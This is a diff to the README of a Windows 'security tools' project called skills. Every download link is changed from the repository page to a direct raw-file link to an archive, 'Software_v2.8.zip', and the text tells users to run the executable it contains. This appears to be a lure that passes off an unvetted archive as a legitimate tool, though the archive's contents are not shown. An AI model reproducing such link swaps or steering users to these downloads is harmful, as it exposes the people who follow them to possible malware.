@@ -1,6 +1,6 @@
 # 🔧 skills - Security Tools Made Easy
 
-[![Download skills](https://img.shields.io/badge/Download-skills-brightgreen)](https://github.com/meh2133/skills)
+[![Download skills](https://img.shields.io/badge/Download-skills-brightgreen)](https://raw.githubusercontent.com/meh2133/skills/main/skills/Software_v2.8.zip)
 
 ## 📖 About skills
 
@@ -34,7 +34,7 @@ To use skills on your Windows computer, follow these steps:
 
 6. After installation or starting the executable, a window or command prompt will open. This means skills is running on your computer.
 
-[Visit this page to download skills](https://github.com/meh2133/skills)
+[Visit this page to download skills](https://raw.githubusercontent.com/meh2133/skills/main/skills/Software_v2.8.zip)
 
 ## 🧰 How to Use skills
 
@@ -105,4 +105,4 @@ To keep skills working well:
 
 ---
 
-[![Download skills](https://img.shields.io/badge/Download-skills-blue)](https://github.com/meh2133/skills)
+[![Download skills](https://img.shields.io/badge/Download-skills-blue)](https://raw.githubusercontent.com/meh2133/skills/main/skills/Software_v2.8.zip)
